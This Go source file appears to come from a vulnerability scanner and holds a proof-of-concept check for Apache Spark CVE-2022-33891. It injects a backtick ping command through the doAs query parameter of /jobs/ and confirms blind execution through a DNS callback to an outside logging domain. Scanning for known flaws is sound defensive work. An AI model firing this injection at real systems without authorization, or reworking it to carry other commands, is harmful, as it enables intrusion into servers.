package spark

import (
	"fmt"
	"time"

	"github.com/veo/vscan/pkg"
)

func CVE_2022_33891(u string) bool {
	if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
		randomstr := pkg.RandomStr()
		payload := fmt.Sprintf("doAs=`ping%%20%s`", randomstr+"."+pkg.CeyeDomain)
		pkg.HttpRequset(u+"/jobs/?"+payload, "GET", "", false, nil)
		time.Sleep(3 * time.Second)
		if pkg.Dnslogchek(randomstr) {
			pkg.GoPocLog(fmt.Sprintf("Found vuln Apache Spark CVE_2022_33891|%s\n", u))
			return true
		}
	}
	return false
}
